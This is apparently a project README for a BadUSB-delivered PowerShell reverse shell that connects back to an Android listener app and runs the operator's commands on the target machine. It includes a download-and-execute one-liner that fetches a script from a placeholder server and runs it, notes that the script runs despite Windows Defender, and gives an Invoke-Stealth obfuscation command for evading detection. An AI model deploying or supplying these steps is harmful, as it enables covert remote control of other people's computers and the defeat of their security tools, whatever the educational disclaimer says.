```markdown
# Reverse TCP PowerShell Shell via BadUSB

A simple PowerShell-based reverse TCP shell designed to be executed via a BadUSB device, connecting back to your Android device running the **rtcp_application** APK. This project was built for educational and testing purposes only.

> **⚠️ Disclaimer:**  
> This tool is for **educational purposes only**. Do not use it on machines you do not own or have explicit permission to test. Unauthorized use of this tool is illegal and unethical.

---

## 📱 Project Overview

- **Script Type**: PowerShell reverse shell  
- **Trigger Method**: Executed via BadUSB (e.g., Rubber Ducky)  
- **Target Receiver**: Android phone running a Unity-based app (`rtcp_application.apk`)  
- **UI & App Note**: The APK is a very basic prototype with poor UI and minimal error handling. It's only meant to demonstrate proof of concept.

---

## 🛠 How It Works

1. **Start the Listener**  
   Launch the `rtcp_application.apk` on your Android phone. It will immediately begin listening for incoming connections.

2. **Deploy the Script**  
   Use a BadUSB device to run the `script.ps1` on a target machine.  
   Recommended method:
   ```powershell
   iex (New-Object Net.WebClient).DownloadString('http://yourserver.com/script.ps1')
   ```

3. **Establish Connection**  
   Once the script is executed, it sends a `hello` message to the host (your phone). The app will display a test command along with an input box and send button.

4. **Send Commands**  
   You can now send any PowerShell command from your phone. Commands will execute on the client machine, and results are returned in the app.

> Note: The PowerShell window is *hidden* but not *fully backgrounded*. It will appear minimized.

---

## 🔄 One-Time Connection

- Each connection is valid only once. If the client disconnects or shuts down, the script must be re-run.
- The IP address in the PowerShell script **must match** your phone’s current IP (shown in the app interface).

---

## 🧪 Testing Notes

- The script can run with **Windows Defender active** (at the time of writing), but any competent security tool or admin will easily detect it.
- This is a **testing and proof-of-concept** tool. It is **not stealthy or production-grade**.

---

## 🔐 Obfuscation (Optional)

To avoid detection from Defender or other tools, you can use [JoelGMSec's Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth) to obfuscate the script:

```powershell
.\Invoke-Stealth.ps1 .\script.ps1 -t All
```

> You can also try specific techniques individually rather than combining them all.

---